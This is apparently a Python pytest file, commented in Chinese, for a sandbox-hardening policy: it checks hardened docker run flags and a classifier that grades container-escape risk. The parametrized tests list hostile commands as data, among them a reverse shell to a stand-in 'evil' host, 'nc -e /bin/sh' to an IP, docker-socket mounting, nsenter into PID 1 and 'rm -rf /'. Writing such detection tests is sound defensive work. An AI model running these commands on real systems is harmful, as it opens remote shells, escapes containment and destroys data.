"""WP7 (MCTX-PLAN-2026-0903 P1-4) 沙箱硬化策略测试。

覆盖: 硬化 docker run 参数 (禁网/只读/cap-drop/提权禁/资源限额/nobody/无宿主env),
逃逸静态分级 (high 拒 / medium 审批 / low 放行), 唯一可写挂载语义。
"""
import pytest

from src.core.sandbox_policy import (HARDENING_DEFAULTS, build_hardened_docker_cmd,
                                     classify_escape_risk, docker_run_cmd_str)


class TestBuildHardenedCmd:
    def test_default_hardening_flags(self):
        cmd = build_hardened_docker_cmd("python:3.12", ["python3", "-c", "print(1)"])
        assert cmd[0:3] == ["docker", "run", "--rm"]
        s = " ".join(cmd)
        assert "--network none" in s or "--network" in s and "none" in s
        assert "--read-only" in s
        assert "--cap-drop ALL" in s
        assert "--security-opt no-new-privileges" in s
        assert "--user 65534:65534" in s
        assert "--pids-limit 256" in s
        assert "--memory 512m" in s
        assert "--cpus 1.0" in s
        # 无 -e 透传: 宿主密钥环境变量绝不进容器
        assert "-e" not in cmd

    def test_network_bridge_only_when_allowed(self):
        off = build_hardened_docker_cmd("img", ["sh"], allow_network=False)
        assert "none" in off
        on = build_hardened_docker_cmd("img", ["sh"], allow_network=True)
        assert "--network" in on and "bridge" in on

    def test_workspace_only_writable_mount(self):
        cmd = build_hardened_docker_cmd("img", ["ls"], host_workspace="/tmp/w")
        joined = " ".join(cmd)
        assert "/tmp/w:/workspace:rw" in joined
        # 除 workspace 外不得有其它 rw 挂载 (-v 值为独立 argv 元素, 尾随 :rw)
        rw_values = [a for a in cmd if a.endswith(":rw")]
        assert len(rw_values) == 1 and rw_values[0].startswith("/tmp/w:")

    def test_explicit_env_whitelist(self):
        cmd = build_hardened_docker_cmd("img", ["run"], env={"ONLY_THIS": "1"})
        assert "-e" in cmd and "ONLY_THIS=1" in cmd
        assert all(not e.startswith("HOST_") for e in cmd if isinstance(e, str))

    def test_cmd_str_quoting(self):
        out = docker_run_cmd_str("img", ["bash", "-c", "echo hi"])
        assert out.startswith("docker run")
        assert "--cap-drop ALL" in out
        assert out.endswith("img bash -c 'echo hi'") or out.endswith("img bash -c echo hi")


class TestClassifyRisk:
    @pytest.mark.parametrize("script", [
        "docker run -v /var/run/docker.sock:/docker.sock alpine",
        "sudo nsenter --target 1 --mount --uts --ipc --pid",
        "chroot /host /bin/sh",
        "mount -t proc proc /proc",
        "cap_add=SYS_ADMIN",
        "unshare -m",
        "ptrace 1234",
    ])
    def test_high_escape_paths(self, script):
        assert classify_escape_risk(script) == "high"

    @pytest.mark.parametrize("script", [
        "bash -i >& /dev/tcp/evil/4444",
        "nc -e /bin/sh 1.2.3.4 5555",
        "rm -rf /",
    ])
    def test_medium_paths(self, script):
        assert classify_escape_risk(script) == "medium"

    def test_benign_low(self):
        assert classify_escape_risk("echo hello; ls /tmp; cat file") == "low"
        assert classify_escape_risk("") == "low"
